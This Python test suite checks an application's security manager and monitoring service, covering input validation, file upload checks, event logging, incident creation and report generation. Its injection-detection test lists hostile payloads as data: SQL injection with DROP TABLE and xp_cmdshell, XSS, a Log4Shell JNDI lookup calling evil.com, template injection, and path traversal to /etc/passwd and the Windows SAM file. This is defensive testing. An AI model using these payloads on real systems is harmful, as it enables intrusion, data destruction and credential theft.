#!/usr/bin/env python3
"""
Test script for Week 2 security enhancements:
- Input validation and sanitization
- Logging and reporting functionality
"""

import os
import sys
import json
import time
import tempfile
from datetime import datetime, timedelta
from typing import Dict, Any, List

# Add the src directory to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from core.security_manager import SecurityManager, SecurityConfig, SecurityLevel, ThreatLevel
from core.monitoring_service import MonitoringService, ActivityType, IncidentStatus

class SecurityEnhancementsTest:
    """Test class for Week 2 security enhancements"""
    
    def __init__(self):
        self.test_results = []
        self.db_path = tempfile.mktemp(suffix='.db')
        
        # Initialize security manager
        self.security_config = SecurityConfig(
            jwt_secret="test-secret-key-for-testing-purposes-only-minimum-32-chars",
            max_failed_attempts=3,
            lockout_duration_minutes=1
        )
        self.security_manager = SecurityManager(self.security_config)
        
        # Initialize monitoring service
        self.monitoring_service = MonitoringService(self.db_path)
        
        print(f"Using temporary database: {self.db_path}")
    
    def run_test(self, test_name: str, test_func):
        """Run a single test and record results"""
        try:
            print(f"\n{'='*50}")
            print(f"Running test: {test_name}")
            print(f"{'='*50}")
            
            result = test_func()
            
            self.test_results.append({
                'test': test_name,
                'status': 'PASS' if result else 'FAIL',
                'timestamp': datetime.now().isoformat()
            })
            
            print(f"Test {test_name}: {'PASS' if result else 'FAIL'}")
            return result
            
        except Exception as e:
            print(f"Test {test_name}: ERROR - {str(e)}")
            self.test_results.append({
                'test': test_name,
                'status': 'ERROR',
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            })
            return False
    
    def test_comprehensive_input_validation(self) -> bool:
        """Test comprehensive input validation"""
        print("Testing comprehensive input validation...")
        
        # Test string validation
        valid, msg, result = self.security_manager.validate_comprehensive_input(
            "normal input", "string", max_length=100
        )
        if not valid:
            print(f"String validation failed: {msg}")
            return False
        
        # Test email validation
        valid, msg, result = self.security_manager.validate_comprehensive_input(
            "test@example.com", "email"
        )
        if not valid:
            print(f"Email validation failed: {msg}")
            return False
        
        # Test number validation
        valid, msg, result = self.security_manager.validate_comprehensive_input(
            "123.45", "number"
        )
        if not valid or result != 123.45:
            print(f"Number validation failed: {msg}")
            return False
        
        # Test JSON validation
        valid, msg, result = self.security_manager.validate_comprehensive_input(
            '{"key": "value"}', "json"
        )
        if not valid or result != {"key": "value"}:
            print(f"JSON validation failed: {msg}")
            return False
        
        print("✓ Comprehensive input validation tests passed")
        return True
    
    def test_advanced_injection_detection(self) -> bool:
        """Test advanced injection pattern detection"""
        print("Testing advanced injection detection...")
        
        # Test SQL injection patterns
        malicious_inputs = [
            "SELECT * FROM users WHERE id = 1; DROP TABLE users;",
            "' OR '1'='1",
            "'; EXEC xp_cmdshell('dir'); --",
            "UNION SELECT username, password FROM users",
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "${jndi:ldap://evil.com/exploit}",
            "{{7*7}}",
            "../../../etc/passwd",
            "../../windows/system32/config/sam"
        ]
        
        for malicious_input in malicious_inputs:
            valid, msg, result = self.security_manager.validate_comprehensive_input(
                malicious_input, "string"
            )
            if valid:
                print(f"Failed to detect malicious input: {malicious_input}")
                return False
        
        print("✓ Advanced injection detection tests passed")
        return True
    
    def test_file_upload_validation(self) -> bool:
        """Test file upload validation"""
        print("Testing file upload validation...")
        
        # Test normal file
        normal_file = b"This is a normal text file content"
        valid, msg = self.security_manager.validate_file_upload(
            normal_file, "document.txt", 
            max_size=1024*1024, 
            allowed_extensions=["txt", "pdf", "doc"]
        )
        if not valid:
            print(f"Normal file validation failed: {msg}")
            return False
        
        # Test dangerous file extension
        valid, msg = self.security_manager.validate_file_upload(
            normal_file, "malware.exe", 
            max_size=1024*1024,
            allowed_extensions=["txt", "pdf", "doc"]
        )
        if valid:
            print(f"Failed to block dangerous file extension: {msg}")
            return False
        
        # Test file size limit
        large_file = b"X" * (11 * 1024 * 1024)  # 11MB file
        valid, msg = self.security_manager.validate_file_upload(
            large_file, "large.txt", 
            max_size=10 * 1024 * 1024  # 10MB limit
        )
        if valid:
            print(f"Failed to block oversized file: {msg}")
            return False
        
        # Test executable file signature
        pe_file = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
        valid, msg = self.security_manager.validate_file_upload(
            pe_file, "notmalware.txt"
        )
        if valid:
            print(f"Failed to detect executable file signature: {msg}")
            return False
        
        print("✓ File upload validation tests passed")
        return True
    
    def test_parameter_validation(self) -> bool:
        """Test parameter dictionary validation"""
        print("Testing parameter validation...")
        
        # Define validation rules
        validation_rules = {
            "username": {"type": "string", "max_length": 50, "required": True},
            "email": {"type": "email", "required": True},
            "age": {"type": "number", "required": False},
            "preferences": {"type": "json", "required": False}
        }
        
        # Test valid parameters
        valid_params = {
            "username": "testuser",
            "email": "test@example.com",
            "age": "25",
            "preferences": '{"theme": "dark"}'
        }
        
        valid, msg, result = self.security_manager.validate_parameter_dict(
            valid_params, validation_rules
        )
        if not valid:
            print(f"Valid parameters validation failed: {msg}")
            return False
        
        # Test missing required parameter
        invalid_params = {
            "username": "testuser"
            # Missing required email
        }
        
        valid, msg, result = self.security_manager.validate_parameter_dict(
            invalid_params, validation_rules
        )
        if valid:
            print(f"Failed to detect missing required parameter: {msg}")
            return False
        
        # Test invalid parameter type
        invalid_params = {
            "username": "testuser",
            "email": "invalid-email-format",
            "age": "25"
        }
        
        valid, msg, result = self.security_manager.validate_parameter_dict(
            invalid_params, validation_rules
        )
        if valid:
            print(f"Failed to detect invalid parameter type: {msg}")
            return False
        
        print("✓ Parameter validation tests passed")
        return True
    
    def test_security_event_logging(self) -> bool:
        """Test security event logging and persistence"""
        print("Testing security event logging...")
        
        # Log various security events
        event_id1 = self.monitoring_service.log_security_event(
            "TEST_EVENT_1",
            ThreatLevel.MEDIUM,
            source_ip="192.168.1.100",
            user_id="testuser",
            description="Test security event 1",
            metadata={"test": "data"}
        )
        
        event_id2 = self.monitoring_service.log_security_event(
            "TEST_EVENT_2",
            ThreatLevel.HIGH,
            source_ip="192.168.1.100",
            user_id="testuser",
            description="Test security event 2"
        )
        
        # Wait a moment for processing
        time.sleep(1)
        
        # Retrieve events
        events = self.monitoring_service.get_security_events(limit=10)
        
        if len(events) < 2:
            print(f"Failed to retrieve logged events: {len(events)} events found")
            return False
        
        # Check event details
        found_event1 = None
        found_event2 = None
        
        for event in events:
            if event.id == event_id1:
                found_event1 = event
            elif event.id == event_id2:
                found_event2 = event
        
        if not found_event1:
            print("Event 1 not found in database")
            return False
        
        if not found_event2:
            print("Event 2 not found in database")
            return False
        
        # Verify event data
        if found_event1.event_type != "TEST_EVENT_1":
            print(f"Event 1 type mismatch: {found_event1.event_type}")
            return False
        
        if found_event1.source_ip != "192.168.1.100":
            print(f"Event 1 source IP mismatch: {found_event1.source_ip}")
            return False
        
        print("✓ Security event logging tests passed")
        return True
    
    def test_suspicious_activity_detection(self) -> bool:
        """Test suspicious activity detection"""
        print("Testing suspicious activity detection...")
        
        # Generate events that should trigger suspicious activity detection
        for i in range(8):
            self.monitoring_service.log_security_event(
                "MALICIOUS_INPUT_DETECTED",
                ThreatLevel.HIGH,
                source_ip="10.0.0.1",
                user_id="attacker",
                description=f"Injection attempt {i+1}"
            )
        
        # Wait for processing
        time.sleep(2)
        
        # Check for suspicious activities
        activities = self.monitoring_service.get_suspicious_activities(min_risk_score=60)
        
        if len(activities) == 0:
            print("No suspicious activities detected")
            return False
        
        # Check activity details
        high_risk_activities = [a for a in activities if a.risk_score >= 80]
        
        if len(high_risk_activities) == 0:
            print("No high-risk activities detected")
            return False
        
        # Verify activity data
        activity = high_risk_activities[0]
        if activity.source_ip != "10.0.0.1":
            print(f"Activity source IP mismatch: {activity.source_ip}")
            return False
        
        if "injection_attempt" not in activity.indicators:
            print(f"Expected indicator not found: {activity.indicators}")
            return False
        
        print("✓ Suspicious activity detection tests passed")
        return True
    
    def test_incident_creation(self) -> bool:
        """Test security incident creation"""
        print("Testing security incident creation...")
        
        # Generate critical event that should create incident
        event_id = self.monitoring_service.log_security_event(
            "ADVANCED_INJECTION_DETECTED",
            ThreatLevel.CRITICAL,
            source_ip="192.168.1.200",
            user_id="attacker",
            description="Critical injection attempt detected"
        )
        
        # Wait for processing
        time.sleep(1)
        
        # Check for incidents
        incidents = self.monitoring_service.get_security_incidents(limit=10)
        
        if len(incidents) == 0:
            print("No security incidents created")
            return False
        
        # Find incident related to our event
        related_incident = None
        for incident in incidents:
            if event_id in incident.related_events:
                related_incident = incident
                break
        
        if not related_incident:
            print("No incident found related to critical event")
            return False
        
        # Verify incident data
        if related_incident.severity != ThreatLevel.CRITICAL:
            print(f"Incident severity mismatch: {related_incident.severity}")
            return False
        
        if related_incident.status != IncidentStatus.OPEN:
            print(f"Incident status mismatch: {related_incident.status}")
            return False
        
        print("✓ Security incident creation tests passed")
        return True
    
    def test_security_report_generation(self) -> bool:
        """Test security report generation"""
        print("Testing security report generation...")
        
        # Generate some test data
        for i in range(5):
            self.monitoring_service.log_security_event(
                f"TEST_REPORT_EVENT_{i}",
                ThreatLevel.MEDIUM,
                source_ip=f"192.168.1.{100+i}",
                description=f"Test event for report {i}"
            )
        
        # Wait for processing
        time.sleep(1)
        
        # Generate report
        report = self.monitoring_service.generate_security_report("daily")
        
        if not report:
            print("Failed to generate security report")
            return False
        
        # Verify report data
        if report.summary["total_events"] == 0:
            print("Report shows no events")
            return False
        
        if len(report.events) == 0:
            print("Report contains no events")
            return False
        
        if len(report.recommendations) == 0:
            print("Report contains no recommendations")
            return False
        
        # Check report structure
        required_fields = ["total_events", "events_by_severity", "top_source_ips"]
        for field in required_fields:
            if field not in report.summary:
                print(f"Missing required field in report summary: {field}")
                return False
        
        print("✓ Security report generation tests passed")
        return True
    
    def test_dashboard_data_generation(self) -> bool:
        """Test security dashboard data generation"""
        print("Testing security dashboard data generation...")
        
        # Generate dashboard data
        dashboard_data = self.monitoring_service.get_security_dashboard_data()
        
        if not dashboard_data:
            print("Failed to generate dashboard data")
            return False
        
        # Check required sections
        required_sections = ["overview", "trends", "top_threats", "severity_distribution"]
        for section in required_sections:
            if section not in dashboard_data:
                print(f"Missing required section in dashboard data: {section}")
                return False
        
        # Check overview metrics
        overview = dashboard_data["overview"]
        required_metrics = ["events_24h", "activities_24h", "incidents_24h"]
        for metric in required_metrics:
            if metric not in overview:
                print(f"Missing required metric in overview: {metric}")
                return False
        
        print("✓ Security dashboard data generation tests passed")
        return True
    
    def test_pattern_analysis(self) -> bool:
        """Test activity pattern analysis"""
        print("Testing activity pattern analysis...")
        
        # Generate coordinated attack pattern
        attack_events = [
            "MALICIOUS_INPUT_DETECTED",
            "ADVANCED_INJECTION_DETECTED", 
            "DANGEROUS_FILE_UPLOAD"
        ]
        
        for event_type in attack_events:
            self.monitoring_service.log_security_event(
                event_type,
                ThreatLevel.HIGH,
                source_ip="10.0.0.100",
                description=f"Coordinated attack: {event_type}"
            )
        
        # Wait for processing
        time.sleep(1)
        
        # Trigger pattern analysis
        self.monitoring_service._analyze_activity_patterns()
        
        # Check for detected patterns
        recent_events = self.monitoring_service.get_security_events(
            start_time=datetime.utcnow() - timedelta(minutes=5)
        )
        
        coordinated_attack_detected = any(
            event.event_type == "COORDINATED_ATTACK_DETECTED" 
            for event in recent_events
        )
        
        if not coordinated_attack_detected:
            print("Coordinated attack pattern not detected")
            return False
        
        print("✓ Pattern analysis tests passed")
        return True
    
    def run_all_tests(self):
        """Run all security enhancement tests"""
        print("Starting Week 2 Security Enhancements Test Suite")
        print("=" * 60)
        
        # Test input validation and sanitization
        self.run_test("Comprehensive Input Validation", self.test_comprehensive_input_validation)
        self.run_test("Advanced Injection Detection", self.test_advanced_injection_detection)
        self.run_test("File Upload Validation", self.test_file_upload_validation)
        self.run_test("Parameter Validation", self.test_parameter_validation)
        
        # Test logging and reporting
        self.run_test("Security Event Logging", self.test_security_event_logging)
        self.run_test("Suspicious Activity Detection", self.test_suspicious_activity_detection)
        self.run_test("Incident Creation", self.test_incident_creation)
        self.run_test("Security Report Generation", self.test_security_report_generation)
        self.run_test("Dashboard Data Generation", self.test_dashboard_data_generation)
        self.run_test("Pattern Analysis", self.test_pattern_analysis)
        
        # Print summary
        print("\n" + "=" * 60)
        print("TEST SUMMARY")
        print("=" * 60)
        
        total_tests = len(self.test_results)
        passed_tests = len([r for r in self.test_results if r['status'] == 'PASS'])
        failed_tests = len([r for r in self.test_results if r['status'] == 'FAIL'])
        error_tests = len([r for r in self.test_results if r['status'] == 'ERROR'])
        
        print(f"Total Tests: {total_tests}")
        print(f"Passed: {passed_tests}")
        print(f"Failed: {failed_tests}")
        print(f"Errors: {error_tests}")
        print(f"Success Rate: {(passed_tests/total_tests)*100:.1f}%")
        
        # Print failed tests
        if failed_tests > 0 or error_tests > 0:
            print("\nFailed/Error Tests:")
            for result in self.test_results:
                if result['status'] in ['FAIL', 'ERROR']:
                    print(f"- {result['test']}: {result['status']}")
                    if 'error' in result:
                        print(f"  Error: {result['error']}")
        
        # Export results
        results_file = "week2_security_test_results.json"
        with open(results_file, 'w') as f:
            json.dump({
                'timestamp': datetime.now().isoformat(),
                'summary': {
                    'total': total_tests,
                    'passed': passed_tests,
                    'failed': failed_tests,
                    'errors': error_tests,
                    'success_rate': (passed_tests/total_tests)*100
                },
                'results': self.test_results
            }, f, indent=2)
        
        print(f"\nDetailed results saved to: {results_file}")
        
        # Clean up
        if os.path.exists(self.db_path):
            os.remove(self.db_path)
        
        return passed_tests == total_tests

if __name__ == "__main__":
    test_suite = SecurityEnhancementsTest()
    success = test_suite.run_all_tests()
    
    if success:
        print("\n🎉 All tests passed!")
        sys.exit(0)
    else:
        print("\n❌ Some tests failed.")
        sys.exit(1)